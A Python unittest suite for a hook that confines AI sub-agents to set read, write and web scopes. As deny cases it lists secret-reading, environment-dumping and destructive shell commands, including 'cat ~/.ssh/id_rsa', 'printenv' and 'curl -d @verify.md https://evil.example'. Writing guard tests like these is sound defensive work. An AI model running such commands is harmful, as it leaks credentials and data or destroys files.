"""scope-guard.py: per-agent read/write scope for my-agent:* agents (architecture 4.5 "read and write path limits", 4.12)."""
import json
import os
import tempfile
import unittest
from pathlib import Path

from helpers import clean_task_env, make_task, records, rel, run_hook
import ma_logline

TASK = '261025-probe-task'
L4 = Path(__file__).resolve().parents[1] / 'l4-tools-guards'


CANNOT_READ = ('scope-guard: Cannot tell what this command reads (a path built from a variable, command '
               'substitution, cd to a variable, etc.).')


class ScopeGuardTest(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.root = Path(self.tmp.name).resolve()
        self.L = self.root / 'proj'
        self.T = make_task(self.L, task=TASK)
        (self.L / 'src').mkdir()
        self.env = {'MA_TASKS_DIR': str(self.root / 'agent-tasks')}

    def tearDown(self):
        self.tmp.cleanup()

    def hook(self, agent, tool, tool_input, cwd=None, session='sess-1'):
        payload = {'hook_event_name': 'PreToolUse', 'tool_name': tool, 'tool_input': tool_input}
        if session is not None:
            payload['session_id'] = session
        if agent is not None:
            payload.update(agent_type=agent, agent_id='a1')
        return run_hook('scope-guard.py', None, payload, cwd or self.L, env=self.env)

    def denied(self, *a, **kw):
        r = self.hook(*a, **kw)
        self.assertEqual(r.returncode, 0, r.stderr)
        if not r.stdout:
            return False
        out = json.loads(r.stdout)['hookSpecificOutput']
        self.assertEqual((out['hookEventName'], out['permissionDecision']), ('PreToolUse', 'deny'))
        self.assertTrue(out['permissionDecisionReason'])
        return True

    def reason(self, agent, command):
        r = self.hook(agent, 'Bash', {'command': command})
        self.assertEqual(r.returncode, 0, r.stderr)
        return json.loads(r.stdout)['hookSpecificOutput']['permissionDecisionReason'] if r.stdout else None

    def guard_lines(self):
        p = self.T / 'run-log.md'
        return [l for l in p.read_text(encoding='utf-8').splitlines() if ' guard: ' in l] if p.exists() else []

    def test_deny_writes_one_guard_line(self):
        r = self.hook('my-agent:coder', 'Bash', {'command': 'cat /etc/hosts'})
        why = json.loads(r.stdout)['hookSpecificOutput']['permissionDecisionReason']
        lines = self.guard_lines()
        self.assertEqual(len(lines), 1)
        kind, f = ma_logline.parse_line(lines[0])
        self.assertEqual(kind, 'guard')
        self.assertEqual(f, {'hook': 'scope-guard', 'agent': 'my-agent:coder', 'id': 'a1', 'tool': 'Bash',
                             'decision': 'deny', 'why': why, 'cwd': str(self.L)})

    def test_deny_line_ends_with_input_cwd(self):
        self.hook('my-agent:coder', 'Bash', {'command': 'cat /etc/hosts'}, cwd=self.L / 'src')
        self.assertTrue(self.guard_lines()[0].endswith(f'cwd={self.L / "src"}'))

    def test_heredoc_with_backticked_word_is_allowed(self):
        bt = chr(96)
        cmd = f"cat > src/notes.md <<'EOF'\nrun {bt}export{bt} first\nEOF"
        self.assertFalse(self.denied('my-agent:coder', 'Bash', {'command': cmd}))
        self.assertEqual(self.guard_lines(), [])
        unquoted = "cat > src/notes.md <<EOF\n$(printenv)\nEOF"
        self.assertTrue(self.denied('my-agent:coder', 'Bash', {'command': unquoted}))

    def test_allowed_call_writes_no_guard_line(self):
        self.assertFalse(self.denied('my-agent:coder', 'Bash', {'command': 'ls src'}))
        self.assertEqual(self.guard_lines(), [])

    def test_no_active_task_denies_without_line(self):
        other = self.root / 'elsewhere'
        other.mkdir()
        r = self.hook('my-agent:coder', 'Bash', {'command': 'ls'}, cwd=other)
        self.assertEqual(json.loads(r.stdout)['hookSpecificOutput']['permissionDecisionReason'],
                         'scope-guard: No active my-agent task (no .active).')
        self.assertEqual(self.guard_lines(), [])

    def test_unwritable_run_log_keeps_the_deny(self):
        want = json.loads(self.hook('my-agent:coder', 'Bash', {'command': 'cat /etc/hosts'}).stdout)
        (self.T / 'run-log.md').unlink()
        (self.T / 'run-log.md').mkdir()   # a folder: append fails
        r = self.hook('my-agent:coder', 'Bash', {'command': 'cat /etc/hosts'})
        self.assertEqual(r.returncode, 0, r.stderr)
        self.assertEqual(json.loads(r.stdout), want)

    def test_environment_read_denied_with_exact_reason(self):
        env_cases = [('env', 'env'), ('printenv HOME', 'printenv HOME'),
                     ('cat /proc/self/environ', 'cat /proc/self/environ'), ('ls; set', 'set'),
                     ('timeout 5 env | head', 'timeout 5 env')]
        for agent in ('architect', 'plan-reviewer', 'verifier', 'reviewer', 'explorer', 'coder', 'writer'):
            for cmd, seg in env_cases:
                with self.subTest(agent=agent, cmd=cmd):
                    self.assertEqual(self.reason(f'my-agent:{agent}', cmd),
                                     f'my-agent scope-guard: {agent} may not read the environment ({seg})')
        self.assertEqual(self.reason('my-agent:coder', 'cat /nonexistent-outside/x'),
                         f'scope-guard: Outside the read scope of coder: {Path("/nonexistent-outside/x").resolve()}')

    def test_environment_commands_with_a_command_pass(self):
        for cmd in ('env -i python3 -V', 'set -e', 'export VAR=x', 'declare -x VAR=1', 'ls $HOME/x'):
            with self.subTest(cmd=cmd):
                reason = self.reason('my-agent:coder', cmd)
                self.assertNotIn('environment', reason or '')
        for cmd in ('env -i python3 -V', 'set -e', 'export VAR=x'):
            self.assertFalse(self.denied('my-agent:coder', 'Bash', {'command': cmd}), cmd)

    def test_environment_read_by_l1_is_silent(self):
        for agent in (None, 'Explore'):
            self.assertFalse(self.denied(agent, 'Bash', {'command': 'printenv'}), agent)

    def test_not_applicable_is_silent(self):
        for agent in (None, 'Explore', 'general-purpose'):
            r = self.hook(agent, 'Read', {'file_path': str(self.root / '.env')})
            self.assertEqual((r.returncode, r.stdout), (0, ''), agent)

    def test_researcher_reads_location_not_outside(self):
        self.assertFalse(self.denied('my-agent:researcher', 'Read', {'file_path': str(self.L / 'src/a.py')}))
        self.assertTrue(self.denied('my-agent:researcher', 'Read', {'file_path': '/Applications/x'}))
        self.assertFalse(self.denied('my-agent:researcher', 'Read', {'file_path': str(self.T / 'work/n.md')}))
        self.assertFalse(self.denied('my-agent:researcher', 'Write', {'file_path': str(self.T / 'work/n.md')}))
        self.assertTrue(self.denied('my-agent:researcher', 'Write', {'file_path': str(self.T / 'plan.md')}))
        self.assertFalse(self.denied('my-agent:researcher', 'WebFetch', {'url': 'https://e.com', 'prompt': 'x'}))

    def test_secret_denied_for_all(self):
        (self.L / '.env').write_text('K=v')
        for agent in ('architect', 'plan-reviewer', 'verifier', 'reviewer', 'explorer', 'coder', 'writer'):
            with self.subTest(agent=agent):
                self.assertTrue(self.denied(f'my-agent:{agent}', 'Read', {'file_path': str(self.L / '.env')}))
        for name in ('.env.local', 'server.pem', 'id.key'):
            self.assertTrue(self.denied('my-agent:coder', 'Read', {'file_path': str(self.L / name)}), name)
        self.assertTrue(self.denied('my-agent:coder', 'Bash', {'command': 'cat ~/.ssh/id_rsa'}))
        self.assertTrue(self.denied('my-agent:coder', 'Grep', {'pattern': 'x', 'path': str(Path.home() / '.aws')}))
        self.assertTrue(self.denied('my-agent:coder', 'Write', {'file_path': str(self.L / '.env')}))

    def test_judge_writes_own_file_only(self):
        self.assertFalse(self.denied('my-agent:verifier', 'Write', {'file_path': str(self.T / 'verify.md')}))
        self.assertTrue(self.denied('my-agent:verifier', 'Write', {'file_path': str(self.T / 'review.md')}))
        self.assertFalse(self.denied('my-agent:reviewer', 'Write', {'file_path': str(self.T / 'review.md')}))
        self.assertFalse(self.denied('my-agent:architect', 'Write', {'file_path': str(self.T / 'plan.md')}))
        self.assertTrue(self.denied('my-agent:architect', 'Write', {'file_path': str(self.L / 'src/a.py')}))
        self.assertFalse(self.denied('my-agent:plan-reviewer', 'Write', {'file_path': str(self.T / 'plan-review.md')}))
        self.assertTrue(self.denied('my-agent:explorer', 'Write', {'file_path': str(self.T / 'explore.md')}))

    def test_gate_analyst_scope(self):
        a = 'my-agent:gate-analyst'
        (self.T / 'gate-tally.md').write_text('t')
        for name in ('gate-tally.md', 'gate-report.md'):
            self.assertFalse(self.denied(a, 'Read', {'file_path': str(self.T / name)}), name)
        self.assertFalse(self.denied(a, 'Write', {'file_path': str(self.T / 'gate-report.md')}))
        for name in ('plan.md', 'run-log.md', 'intake.md', 'work/x.md'):
            self.assertTrue(self.denied(a, 'Read', {'file_path': str(self.T / name)}), name)
        self.assertTrue(self.denied(a, 'Read', {'file_path': str(self.L / 'src/a.py')}))
        self.assertTrue(self.denied(a, 'Write', {'file_path': str(self.T / 'gate-tally.md')}))
        self.assertTrue(self.denied(a, 'Write', {'file_path': str(self.T / 'work/x.md')}))
        self.assertTrue(self.denied(a, 'Write', {'file_path': str(self.root / 'outside' / 'x.md')}))
        self.assertTrue(self.denied(a, 'Bash', {'command': 'echo x > gate-report.md'}))
        self.assertTrue(self.denied(a, 'WebFetch', {'url': 'https://e.com', 'prompt': 'x'}))

    def test_judge_bash_is_read_only(self):
        self.assertTrue(self.denied('my-agent:reviewer', 'Bash', {'command': "sed -i '' s/a/b/ src/x"}))
        self.assertTrue(self.denied('my-agent:verifier', 'Bash', {'command': 'git stash'}))
        self.assertTrue(self.denied('my-agent:explorer', 'Bash', {'command': 'ls > out.txt'}))
        self.assertFalse(self.denied('my-agent:verifier', 'Bash', {'command': 'python3 -m unittest 2>&1 | tail -5'}))
        self.assertFalse(self.denied('my-agent:reviewer', 'Bash', {'command': 'git diff && git status --porcelain'}))
        self.assertFalse(self.denied('my-agent:explorer', 'Bash', {'command': 'grep -rn foo src/'}))
        self.assertTrue(self.denied('my-agent:explorer', 'Bash', {'command': 'cat /etc/hosts'}))

    def test_reads_stay_in_location(self):
        self.assertFalse(self.denied('my-agent:explorer', 'Glob', {'pattern': '**/*.py'}))
        self.assertFalse(self.denied('my-agent:explorer', 'Grep', {'pattern': 'x'}))
        self.assertTrue(self.denied('my-agent:explorer', 'Grep', {'pattern': 'x', 'path': str(self.root)}))
        self.assertTrue(self.denied('my-agent:architect', 'Read', {'file_path': '/etc/hosts'}))
        self.assertTrue(self.denied('my-agent:architect', 'Glob', {'pattern': '/etc/*'}))

    def test_writer_reference_files(self):
        ref = self.L / 'docs' / 'ref.md'
        ref.parent.mkdir(exist_ok=True)
        ref.write_text('r')
        self.assertTrue(self.denied('my-agent:writer', 'Read', {'file_path': '/Applications/x'}))
        (self.T / 'plan.md').write_text('# Plan\n\n## Reference files\n\n- `docs/ref.md`\n\n## Approval\n')
        self.assertFalse(self.denied('my-agent:writer', 'Read', {'file_path': str(ref)}))
        self.assertFalse(self.denied('my-agent:writer', 'Write', {'file_path': str(self.T / 'prototype/index.html')}))
        self.assertTrue(self.denied('my-agent:writer', 'Write', {'file_path': str(ref)}))

    def scratch(self, sid='sess-1', slug='x-slug'):
        return Path('/tmp').resolve() / f'claude-{os.getuid()}' / slug / sid / 'scratchpad' / 'n.txt'

    def test_read_roots(self):
        outside = self.root / 'outside'
        outside.mkdir()
        (self.T / 'plan.md').write_text(f'# Plan\n\n## Reference files\n\n- `{outside / "ref.md"}`\n\n## Approval\n')
        plugin = Path(__file__).resolve().parents[1]
        data = self.root / 'agent-tasks'
        ok = [data / 'feedback.md', plugin / 'SKILL.md', self.scratch(), outside / 'ref.md', self.L / 'src' / 'a.py']
        for agent in ('explorer', 'architect', 'plan-reviewer', 'verifier', 'reviewer', 'coder', 'writer',
                      'researcher'):
            for path in ok:
                with self.subTest(agent=agent, path=str(path)):
                    self.assertFalse(self.denied(f'my-agent:{agent}', 'Read', {'file_path': str(path)}))
            with self.subTest(agent=agent, case='denied'):
                for path in ('/Applications/x', self.scratch('other-id')):
                    r = self.hook(f'my-agent:{agent}', 'Read', {'file_path': str(path)})
                    reason = json.loads(r.stdout)['hookSpecificOutput']['permissionDecisionReason']
                    self.assertEqual(reason, f'scope-guard: Outside the read scope of {agent}: {Path(path).resolve()}')
                for sid in (None, ''):
                    r = self.hook(f'my-agent:{agent}', 'Read', {'file_path': str(self.scratch())}, session=sid)
                    self.assertIn('Outside the read scope', json.loads(r.stdout)['hookSpecificOutput']['permissionDecisionReason'])
                self.assertTrue(self.denied(f'my-agent:{agent}', 'Read', {'file_path': str(self.scratch('..'))}))

    def test_gate_analyst_keeps_two_files(self):
        a = 'my-agent:gate-analyst'
        plugin = Path(__file__).resolve().parents[1]
        for path in (self.root / 'agent-tasks' / 'feedback.md', plugin / 'SKILL.md', self.scratch(),
                     self.L / 'src' / 'a.py'):
            self.assertTrue(self.denied(a, 'Read', {'file_path': str(path)}), str(path))

    def test_reference_secret_still_denied(self):
        outside = self.root / 'outside'
        outside.mkdir()
        (self.T / 'plan.md').write_text(f'# Plan\n\n## Reference files\n\n- `~/.ssh/id_rsa`\n- `{outside / ".env"}`\n')
        for agent in ('researcher', 'writer', 'coder', 'explorer'):
            for path in (Path.home() / '.ssh' / 'id_rsa', outside / '.env'):
                reason = json.loads(self.hook(f'my-agent:{agent}', 'Read', {'file_path': str(path)}).stdout)
                self.assertEqual(reason['hookSpecificOutput']['permissionDecisionReason'],
                                 f'scope-guard: Secret paths are not read or written: {path}')
            self.assertEqual(self.reason(f'my-agent:{agent}', 'printenv'),
                             f'my-agent scope-guard: {agent} may not read the environment (printenv)')

    def test_explorer_bash_reads_data_folder(self):
        data = self.root / 'agent-tasks'
        self.assertFalse(self.denied('my-agent:explorer', 'Bash', {'command': f'grep -rn x {data}'}))
        self.assertFalse(self.denied('my-agent:explorer', 'Bash', {'command': f'cat {data / "feedback.md"}'}))

    def test_environment_read_in_substitutions_and_wrappers(self):
        cases = [('echo $(printenv)', 'printenv'), ('echo "$(env)"', 'env'), ('printenv $(date)', 'printenv $(date)'),
                 ('setsid env', 'setsid env'), ('python3 -c "import os;print(os.environ)"',
                                                'python3 -c import os;print(os.environ)'),
                 ('python3 -c "from os import environ; print(environ)"',
                  'python3 -c from os import environ; print(environ)'),
                 ('echo $(printenv HOME)', 'printenv HOME')]
        for cmd, seg in cases:
            with self.subTest(cmd=cmd):
                self.assertEqual(self.reason('my-agent:coder', cmd),
                                 f'my-agent scope-guard: coder may not read the environment ({seg})')
        self.assertEqual(self.reason('my-agent:coder', 'echo $(date)'), CANNOT_READ)
        self.assertFalse(self.denied('my-agent:coder', 'Bash', {'command': 'python3 -c "print(1)"'}))

    def test_literal_variable_paths(self):
        coder, L = 'my-agent:coder', self.L
        (L / 'a').mkdir()
        (L / 'a' / 'b').write_text('x')
        self.assertFalse(self.denied(coder, 'Bash', {'command': f'P={L}/a; cat $P/b'}))
        self.assertEqual(self.reason(coder, 'P=/etc; cat $P/hosts'),
                         f'scope-guard: Outside the read scope of coder: {Path("/etc/hosts").resolve()}')
        ssh = Path.home() / '.ssh'
        self.assertEqual(self.reason(coder, f'P={ssh}; cat $P/id_rsa'),
                         f'scope-guard: Secret paths are not read or written: {(ssh / "id_rsa").resolve()}')
        for cmd in (f'false && P={L}/a; cat $P/etc/passwd', f'P={L}/a; P=/etc; cat $P/passwd'):
            with self.subTest(cmd=cmd):
                self.assertEqual(self.reason(coder, cmd), CANNOT_READ)

    def test_relative_and_cd_reads(self):
        ex ='my-agent:explorer'
        (self.L / 'README.md').write_text('r')
        self.assertFalse(self.denied(ex, 'Bash', {'command': 'cat ../README.md'}, cwd=self.L / 'src'))
        self.assertFalse(self.denied(ex, 'Bash', {'command': 'cd src && cat ../README.md'}))
        self.assertEqual(self.reason(ex, 'cat ../../outside.txt'),
                         f'scope-guard: Outside the read scope of explorer: {(self.L.parent.parent / "outside.txt")}')
        for cmd in ('cat $D/x', 'cd "$D" && cat x'):
            self.assertEqual(self.reason(ex, cmd), 'scope-guard: Cannot tell what this command reads (a path built from a variable, command substitution, cd to a variable, etc.).')

    def test_coder_in_worktree_of_linked_location(self):
        main = self.root / 'main'
        common = main / '.git'
        for n in ('loc', 'agent-x'):
            (common / 'worktrees' / n).mkdir(parents=True)
            (common / 'worktrees' / n / 'commondir').write_text('../..\n')
        loc = self.root / 'loc'
        T = make_task(loc, task=TASK, git=False)
        (loc / '.git').write_text(f'gitdir: {common / "worktrees" / "loc"}\n')
        W = loc / '.claude' / 'worktrees' / 'agent-x'
        (W / 'src').mkdir(parents=True)
        (W / '.git').write_text(f'gitdir: {common / "worktrees" / "agent-x"}\n')
        c = 'my-agent:coder'
        self.assertFalse(self.denied(c, 'Write', {'file_path': str(W / 'src/a.py'), 'content': 'x'}, cwd=W))
        self.assertFalse(self.denied(c, 'Read', {'file_path': str(W / 'src/a.py')}, cwd=W))
        self.assertTrue(self.denied(c, 'Write', {'file_path': str(W / '.git/x'), 'content': 'x'}, cwd=W))

    def test_coder_worktree_writes(self):
        (self.L / '.git' / 'worktrees' / 'agent-x').mkdir(parents=True)
        W = self.L / '.claude' / 'worktrees' / 'agent-x'
        (W / 'src').mkdir(parents=True)
        (W / '.git').write_text(f"gitdir: {self.L / '.git' / 'worktrees' / 'agent-x'}\n")
        self.assertFalse(self.denied('my-agent:coder', 'Write', {'file_path': str(W / 'src/a.py')}, cwd=W))
        self.assertFalse(self.denied('my-agent:coder', 'Bash', {'command': 'touch src/b.py'}, cwd=W))
        self.assertTrue(self.denied('my-agent:coder', 'Write', {'file_path': str(self.L / 'src/a.py')}, cwd=W))
        self.assertTrue(self.denied('my-agent:coder', 'Write', {'file_path': str(records(self.L) / 'x/y')}, cwd=W))
        self.assertFalse(self.denied('my-agent:coder', 'Read', {'file_path': str(self.T / 'plan.md')}, cwd=W))

    def test_coder_main_tree(self):
        self.assertFalse(self.denied('my-agent:coder', 'Edit', {'file_path': str(self.L / 'src/a.py')}))
        self.assertTrue(self.denied('my-agent:coder', 'Edit', {'file_path': str(self.T / 'plan.md')}))
        self.assertTrue(self.denied('my-agent:coder', 'Bash', {'command': f'rm -rf {rel()}'}))
        self.assertTrue(self.denied('my-agent:coder', 'Bash', {'command': 'echo x > "$OUT"'}))
        self.assertFalse(self.denied('my-agent:coder', 'Bash', {'command': 'python3 -m unittest'}))

    def test_coder_cannot_reach_records_by_case_cd_or_link(self):
        for raw in (rel().upper(), rel().swapcase()):
            with self.subTest(raw=raw):
                self.assertTrue(self.denied('my-agent:coder', 'Write',
                                            {'file_path': str(self.L / raw / TASK / 'review.md'), 'content': 'x'}))
        head, _, tail = rel().rpartition('/')
        cd = f'cd {head} && echo "BLOCKER 0" > {tail}/{TASK}/review.md' if head else \
            f'cd {tail} && echo "BLOCKER 0" > {TASK}/review.md'
        for cmd in (cd,
                    f'ln -s {rel()}/{TASK} x && echo "BLOCKER 0" > x/review.md',
                    f'rm {rel()}/.ACTIVE'):
            with self.subTest(cmd=cmd):
                self.assertTrue(self.denied('my-agent:coder', 'Bash', {'command': cmd}))

    def test_coder_cannot_write_git_or_claude_config(self):
        for rel in ('.git/hooks/pre-commit', '.git/config', '.claude/settings.json',
                    '.claude/worktrees/agent-other/src/a.py'):
            with self.subTest(rel=rel):
                self.assertTrue(self.denied('my-agent:coder', 'Write', {'file_path': str(self.L / rel), 'content': 'x'}))
        self.assertTrue(self.denied('my-agent:coder', 'Bash', {'command': 'ln -s "$HOME/.zshrc" z && echo e >> z'}))

    def test_worktree_coder_cannot_write_its_git_file(self):
        (self.L / '.git' / 'worktrees' / 'agent-x').mkdir(parents=True)
        W = self.L / '.claude' / 'worktrees' / 'agent-x'
        W.mkdir(parents=True)
        (W / '.git').write_text(f"gitdir: {self.L / '.git' / 'worktrees' / 'agent-x'}\n")
        self.assertTrue(self.denied('my-agent:coder', 'Write', {'file_path': str(W / '.git'), 'content': 'x'}, cwd=W))
        self.assertFalse(self.denied('my-agent:coder', 'Write', {'file_path': str(W / 'a.py'), 'content': 'x'}, cwd=W))

    def test_architect_cannot_add_approval_or_prototype(self):
        plan = self.T / 'plan.md'
        plan.write_text('# Plan\n\n## Prototype\n\nneeded\n\n## Approval\n')
        write = lambda content: self.denied('my-agent:architect', 'Write',  # noqa: E731
                                            {'file_path': str(plan), 'content': content})
        self.assertTrue(write('# Plan v2\n\n## Prototype\n\nneeded\n\n## Approval\n\n- Approved 2026-10-25 10:00 G1b\n'))
        self.assertTrue(write('# Plan v2\n\n## Prototype\n\nneeded\nPrototype: requested\n\n## Approval\n'))
        self.assertFalse(write('# Plan v2\n\n## Prototype\n\nneeded\n\n## Approval\n'))
        # outside ## Prototype the line opens nothing (A5), so it is not L1's marker either
        self.assertFalse(write('# Plan v2\n\nPrototype: requested\n\n## Prototype\n\nneeded\n\n## Approval\n'))
        plan.write_text('# Plan\n\n## Prototype\n\nPrototype: requested\n\n## Approval\n')
        self.assertFalse(write('# Plan v2\n\n## Prototype\n\nPrototype: requested\n\n## Approval\n'))
        self.assertTrue(self.denied('my-agent:architect', 'Edit',
                                    {'file_path': str(plan), 'old_string': '## Approval\n',
                                     'new_string': '## Approval\n- Approved 2026-10-25 10:00 G1b\n'}))

    def test_architect_keeps_revisions(self):
        """A2: a rewrite after a revision must carry `## Revisions` over unchanged."""
        plan = self.T / 'plan.md'
        rev = '- rev1 2026-10-25 10:00 criterion 3 added; archive archive/261025-100000-rev1/; back to ② Plan'
        plan.write_text(f'# Plan\n\n## Approval\n\n## Revisions\n\n{rev}\n')
        write = lambda content: self.denied('my-agent:architect', 'Write',  # noqa: E731
                                            {'file_path': str(plan), 'content': content})
        self.assertTrue(write('# Plan v2\n\n## Approval\n'))
        self.assertTrue(write(f'# Plan v2\n\n## Approval\n\n## Revisions\n\n{rev[:-3]}\n'))
        self.assertFalse(write(f'# Plan v2\n\n## Existing work\n\n| a | keep | b |\n\n## Approval\n\n## Revisions\n\n{rev}\n'))
        self.assertTrue(self.denied('my-agent:architect', 'Edit',
                                    {'file_path': str(plan), 'old_string': rev, 'new_string': ''}))
        plan.write_text('# Plan\n\n## Approval\n')
        self.assertFalse(write('# Plan v2\n\n## Approval\n'))

    def test_secret_spellings_denied(self):
        for agent, raw in (('explorer', '.ENV'), ('verifier', 'SERVER.PEM'), ('coder', 'Id.Key')):
            with self.subTest(raw=raw):
                self.assertTrue(self.denied(f'my-agent:{agent}', 'Read', {'file_path': str(self.L / raw)}))
        self.assertTrue(self.denied('my-agent:explorer', 'Read', {'file_path': str(Path.home() / '.SSH/id_rsa')}))
        for cmd in ('cat $HOME/.ssh/id_rsa', 'cat "$HOME/.ssh/id_rsa"', 'cd "$HOME" && cat .ssh/id_rsa'):
            with self.subTest(cmd=cmd):
                self.assertTrue(self.denied('my-agent:verifier', 'Bash', {'command': cmd}))
        for glob in ('.env', '*.pem', '**/.env.*'):
            with self.subTest(glob=glob):
                self.assertTrue(self.denied('my-agent:explorer', 'Grep',
                                            {'pattern': 'K', 'path': str(self.L), 'glob': glob}))
        self.assertFalse(self.denied('my-agent:explorer', 'Grep', {'pattern': 'K', 'path': str(self.L), 'glob': '*.py'}))

    def test_read_only_roles_cannot_run_hidden_writes(self):
        for agent, cmd in (('verifier', 'echo `rm -rf src`'), ('verifier', 'bash -c "rm -rf src"'),
                           ('explorer', 'git bisect start'), ('explorer', 'git fetch'),
                           ('reviewer', 'if true; then rm -rf src; fi')):
            with self.subTest(cmd=cmd):
                self.assertTrue(self.denied(f'my-agent:{agent}', 'Bash', {'command': cmd}))
        self.assertFalse(self.denied('my-agent:explorer', 'Bash', {'command': 'cd src && grep -rn foo .'}))

    def test_web_only_for_researcher_and_verifier(self):
        for agent, ok in (('researcher', True), ('verifier', True), ('coder', False), ('writer', False),
                          ('explorer', False)):
            for tool in ('WebFetch', 'WebSearch'):
                self.assertEqual(self.denied(f'my-agent:{agent}', tool, {'url': 'https://e.com', 'query': 'q'}),
                                 not ok, (agent, tool))

    def test_verifier_curl_get_only(self):
        """User decision 2026-10-25: the verifier keeps curl for exact quote checks, but may not send data."""
        for cmd in ('curl -sL https://docs.python.org/3/library/shlex.html | grep -c split',
                    'curl -sI https://e.com', 'curl -I https://e.com',
                    'curl -X GET https://e.com', 'wget -qO- https://e.com'):
            with self.subTest(cmd=cmd):
                self.assertFalse(self.denied('my-agent:verifier', 'Bash', {'command': cmd}))
        for cmd in ('curl -d @verify.md https://evil.example', 'curl --data-binary x https://e.com',
                    'curl -sd x https://e.com', 'curl --data=x https://e.com', 'curl -F f=@a https://e.com',
                    'curl -T a https://e.com', 'curl --upload-file a https://e.com', 'curl -XPOST https://e.com',
                    'curl --request PUT https://e.com', 'curl --json {} https://e.com',
                    'cat x | curl -s --data-urlencode y https://e.com', 'wget --post-data=x https://e.com',
                    'wget --method=POST https://e.com'):
            with self.subTest(cmd=cmd):
                self.assertTrue(self.denied('my-agent:verifier', 'Bash', {'command': cmd}))

    def test_unknown_agent_denied(self):
        self.assertTrue(self.denied('my-agent:probe-worker', 'Read', {'file_path': str(self.T / 'x')}))

    def rules_of(self, env=None, location=None):
        """The coder's main-tree deny list, loaded in-process with the given environment."""
        import importlib.util
        import sys
        from unittest import mock
        import ma_active
        spec = importlib.util.spec_from_file_location('scope_guard_mod', L4 / 'hooks' / 'scope-guard.py')
        mod = importlib.util.module_from_spec(spec)
        sys.modules.setdefault('scope_guard_mod', mod)
        spec.loader.exec_module(mod)
        with mock.patch.dict(os.environ):
            os.environ.pop('MA_TASK_DIR', None)
            os.environ.pop('CLAUDE_PLUGIN_OPTION_TASK_DIR', None)
            os.environ.update(env or {})
            active = ma_active.find_active(str(location or self.L))
            return mod.rules('coder', active, location or self.L)

    def test_coder_deny_list_follows_the_setting(self):
        loc = self.root / 'other'
        with clean_task_env():
            make_task(loc, task=TASK, sub='notes/agent')
        r = self.rules_of({'CLAUDE_PLUGIN_OPTION_TASK_DIR': 'notes/agent'}, loc)
        self.assertEqual(r.deny_write, [loc / 'notes/agent', loc / '.git', loc / '.claude'])
        loc2 = self.root / 'third'
        with clean_task_env():
            make_task(loc2, task=TASK, sub='.my-agent')
        r = self.rules_of({}, loc2)
        self.assertEqual(r.deny_write[0], loc2 / '.my-agent')

    def test_case_folding_with_mixed_case_setting(self):
        loc = self.root / 'cased'
        with clean_task_env():
            make_task(loc, task=TASK, sub='Notes/Agent')
        env = {'MA_TASKS_DIR': str(self.root / 'agent-tasks'), 'CLAUDE_PLUGIN_OPTION_TASK_DIR': 'Notes/Agent'}

        def hook(agent, path):
            payload = {'hook_event_name': 'PreToolUse', 'tool_name': 'Write', 'tool_input': {'file_path': str(path)},
                       'session_id': 'sess-1', 'agent_type': agent, 'agent_id': 'a1'}
            r = run_hook('scope-guard.py', None, payload, loc, env=env, drop=('MA_TASK_DIR',))
            self.assertEqual(r.returncode, 0, r.stderr)
            return r.stdout
        self.assertIn('Outside the write scope of coder', hook('my-agent:coder', loc / 'notes/agent/x.md'))
        self.assertEqual(hook('my-agent:verifier', loc / 'notes/agent' / TASK / 'verify.md'), '')

    def test_link_layout_protects_and_allows_through_both_names(self):
        loc = self.root / 'linked'
        with clean_task_env():
            make_task(loc, task=TASK, sub='docs/agent')
        (loc / '.my-agent').symlink_to('docs/agent')
        env = {'MA_TASKS_DIR': str(self.root / 'agent-tasks')}

        def hook(agent, path):
            payload = {'hook_event_name': 'PreToolUse', 'tool_name': 'Write', 'tool_input': {'file_path': str(path)},
                       'session_id': 'sess-1', 'agent_type': agent, 'agent_id': 'a1'}
            r = run_hook('scope-guard.py', None, payload, loc, env=env, drop=('MA_TASK_DIR', 'CLAUDE_PLUGIN_OPTION_TASK_DIR'))
            self.assertEqual(r.returncode, 0, r.stderr)
            return r.stdout
        for base in ('.my-agent', 'docs/agent'):
            with self.subTest(base=base):
                self.assertEqual(hook('my-agent:verifier', loc / base / TASK / 'verify.md'), '')
                self.assertIn('Outside the write scope of coder', hook('my-agent:coder', loc / base / TASK / 'x.md'))

    def test_no_active_denies_my_agent(self):
        (records(self.L) / '.active').unlink()
        self.assertTrue(self.denied('my-agent:explorer', 'Read', {'file_path': str(self.L / 'src/a.py')}))

    def test_coder_git_mv(self):
        coder = 'my-agent:coder'
        self.assertFalse(self.denied(coder, 'Bash', {'command': 'git mv src/a.py src/b.py'}))
        self.assertTrue(self.denied(coder, 'Bash', {'command': 'git mv src/a.py /nonexistent-outside/b.py'}))
        # readable but not writable (the data folder): the write scope is what denies it
        self.assertIn('Outside the write scope of coder',
                      self.reason(coder, f'git mv src/a.py {self.root / "agent-tasks" / "b.py"}'))
        self.assertIn('Outside the write scope of coder', self.reason(coder, f'git mv src/a.py {rel()}/x'))
        for cmd in ('git mv -f a b', 'git mv a', 'git -C sub mv a b', f'echo {rel()} | xargs git mv src/a.py src/b.py',
                    'GIT_DIR=x git mv src/a.py src/b.py', 'GIT_WORK_TREE=/x git mv src/a.py src/b.py',
                    'git add .', 'git commit -m x', 'git checkout b', 'git reset --hard'):
            with self.subTest(cmd=cmd):
                self.assertIn('Cannot tell where this command writes', self.reason(coder, cmd))

    def test_verifier_git_mv_only_reads(self):
        self.assertIn('only reads and checks', self.reason('my-agent:verifier', 'git mv a b'))

    def test_script_error_exits_nonzero(self):
        payload = json.dumps({'agent_type': 'my-agent:coder', 'tool_name': 'Read', 'tool_input': 'oops',
                              'cwd': str(self.L)})
        r = run_hook('scope-guard.py', None, payload, self.L, env=self.env)
        self.assertNotEqual(r.returncode, 0)
        self.assertEqual(r.stdout, '')


if __name__ == '__main__':
    unittest.main()
